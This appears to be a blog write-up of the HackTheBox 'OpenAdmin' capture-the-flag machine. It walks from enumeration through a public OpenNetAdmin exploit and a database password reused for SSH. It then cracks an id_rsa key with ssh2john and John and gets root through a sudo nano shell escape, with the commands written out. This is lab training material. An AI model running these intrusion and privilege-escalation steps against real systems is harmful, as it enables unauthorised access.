---
author: "Shebu"
title: "Openadmin: HTB"
date: "2021-11-17"
tags: ["opennetadmin", "gtfobins", "ssh2john", "rsa"]
cover:
    image: img/Openadmin.jpg
    # can also paste direct link from external site
    # ex. https://i.ibb.co/K0HVPBd/paper-mod-profilemode.png
    alt: "<alt text>"
    caption: "<text>"
    relative: false # To use relative path for cover image, used in hugo Page-bundles
---

## Summary -

**OpenAdmin** from HackTheBox is an easy-rated machine which involves an exploit for OpenNetAdmin to get a foothold on the machine. There are 2 users on the box Jimmy and Joanna . We get the password for Jimmy via database config file & then ssh as Jimmy, then on enumerating we find an internal application running.Doing a simple curl command reveals id_rsa key of Joanna. We then crack the password of the id_rsa file and ssh into the machine as Joanna. For root, we find that we have sudo privileges over nano . We refer sudo entry for nano on  [gtfobins](https://gtfobins.github.io/gtfobins/nano/)  & we easily escalate our privileges as root!

| **Name  -** | Openadmin |
|:---:|---|
| **OS   -**    | Linux |
| **Difficulty -** | Easy |
| **Room Link   -** | https://www.hackthebox.eu/home/machines/profile/222 |
| **Creator   -** | [del_KZx497Ju](https://www.hackthebox.eu/home/users/profile/82600) 
 |

## Enumeration -

**Nmap**

```zsh
# Nmap 7.91 scan initiated Tue Jul  6 14:02:13 2021 as: nmap -sC -sV -p 22,80 -v -oN openadmin.nmap 10.10.10.171
Nmap scan report for 10.10.10.171
Host is up (0.46s latency).

PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 4b:98:df:85:d1:7e:f0:3d:da:48:cd:bc:92:00:b7:54 (RSA)
|   256 dc:eb:3d:c9:44:d1:18:b1:22:b4:cf:de:bd:6c:7a:54 (ECDSA)
|_  256 dc:ad:ca:3c:11:31:5b:6f:e6:a4:89:34:7c:9b:e5:50 (ED25519)
80/tcp open  http    Apache httpd 2.4.29 ((Ubuntu))
| http-methods: 
|_  Supported Methods: HEAD GET POST OPTIONS
|_http-server-header: Apache/2.4.29 (Ubuntu)
|_http-title: Apache2 Ubuntu Default Page: It works
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Read data files from: /usr/bin/../share/nmap
Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Tue Jul  6 14:02:42 2021 -- 1 IP address (1 host up) scanned in 28.86 seconds

``` 
As you can see there are 2 ports open :

**Port 22**: `SSH`   -  `OpenSSH 7.6p1 Ubuntu 4ubuntu0.3`

**Port 80**: `HTTP`  -  `Apache httpd 2.4.29`

**Web Enumeration**

At port 80 we find default page of apache 

![image.png](https://cdn.hashnode.com/res/hashnode/image/upload/v1625730338625/uCtP0pGDm.png)
Lets do some directory bruteforcing. Dirsearch reveals the following directories 

```
/music
/artwork
/sierra
``` 
On visiting the ***/music*** directory It gives us this page
![image.png](https://cdn.hashnode.com/res/hashnode/image/upload/v1625730702532/MBOEMMzap.png)
 This login button takes us to `http://openadmin.htb/ona` .On visiting,we get a page like this 

![image.png](https://cdn.hashnode.com/res/hashnode/image/upload/v1625730557375/VnYYMhh6F.png)

From the above , we could identify that the software is `OpenNetAdmin` and the version is `v18.1.1`
## Foothold  -

We use `searchsploit` to find any publicly available exploits for `OpenNetAdmin - v18.1.1` ,& we find this

![image.png](https://cdn.hashnode.com/res/hashnode/image/upload/v1625829682381/9bCc51NNt.png)

Lets mirror it to our current directory

![image.png](https://cdn.hashnode.com/res/hashnode/image/upload/v1625829835307/xekdj_qUR.png)

Lets run the exploit 

![image.png](https://cdn.hashnode.com/res/hashnode/image/upload/v1625830040051/GFqNaKtRd.png)
And we are `www-data `  user

There are 2 users on the machine `Jimmy` and `Joanna`

```bash
 cat /etc/passwd | grep -i "bash"
``` 

![image.png](https://cdn.hashnode.com/res/hashnode/image/upload/v1625830263020/lMQid09DX.png)

## Shell as Jimmy -
On enumerating the current directory we find a `database config file` which contains a password !

```bash
cat local/config/database_settings.inc.php | grep -i "pass"
``` 

![image.png](https://cdn.hashnode.com/res/hashnode/image/upload/v1625830572487/QNWheVAMf.png)
We are not sure which user's password is this , so first we try to ssh into the machine as Jimmy & we're logged in !

![image.png](https://cdn.hashnode.com/res/hashnode/image/upload/v1625830737331/wKrurZtl2.png)

Running `id`  command we see that we are part of `internal` group .Lets keep that in mind and move ahead & enumerate further ..
We run a find command to check for files which jimmy owns 

```bash
 find / -user jimmy 2>/dev/null
``` 

![image.png](https://cdn.hashnode.com/res/hashnode/image/upload/v1625831118840/e9JJqmT43.png)
HMM..INTERESTING ! Lets check that  `/var/www/internal/` directory

![image.png](https://cdn.hashnode.com/res/hashnode/image/upload/v1625831234552/MBVd6-DoMg.png)
Seems like there is an internal website running here 🧐 .We can verify it by running 
 
```bash
netstat -tulpn
``` 

![image.png](https://cdn.hashnode.com/res/hashnode/image/upload/v1625831363346/jweAQt1FR2.png)

## Shell as Joanna -

Lets check that internal website running at `port 52486` by using `curl` command

```bash
 curl localhost:52846/main.php
``` 

![image.png](https://cdn.hashnode.com/res/hashnode/image/upload/v1625832226010/qxh-pQYio.png)
Voila we get an **encrypted id_rsa key** !! Lets crack it and ssh in as *Joanna *!

Run `ssh2john` against `id_rsa` file to obtain a hash and crack it using John -

```bash
 /usr/share/john/ssh2john.py --wordlist=/usr/share/wordlists/rockyou.txt id_rsa >> hash

 john --wordlists=/usr/share/wordlists/rockyou.txt hash
``` 

![image.png](https://cdn.hashnode.com/res/hashnode/image/upload/v1625831758138/VX9FLY6z2.png)
We get Joanna's password !Lets try ssh into the box as Joanna 

![image.png](https://cdn.hashnode.com/res/hashnode/image/upload/v1625831939144/xnOPraY0g3.png)
 Grab the  `user.txt`🚩
  
![image.png](https://cdn.hashnode.com/res/hashnode/image/upload/v1625832725095/-oQxN0eMe.png)

## Shell as Root -
Running `sudo -l` we find we could run nano on `/opt/priv` directory

![image.png](https://cdn.hashnode.com/res/hashnode/image/upload/v1625832068247/PFgUlh4Mw.png)
So we check  [GTFOBINS](https://gtfobins.github.io/gtfobins/nano/)  for any **sudo entry for nano**

![image.png](https://cdn.hashnode.com/res/hashnode/image/upload/v1625832344408/Ds0lpTgVL.png)

```
sudo /bin/nano /opt/priv
^R^X
reset; sh 1>&0 2>&0
```

Run the above commands to get a root shell 
Grab the `root.txt ` 🚩  😎

![image.png](https://cdn.hashnode.com/res/hashnode/image/upload/v1625834602463/OH8oNETD7.png)
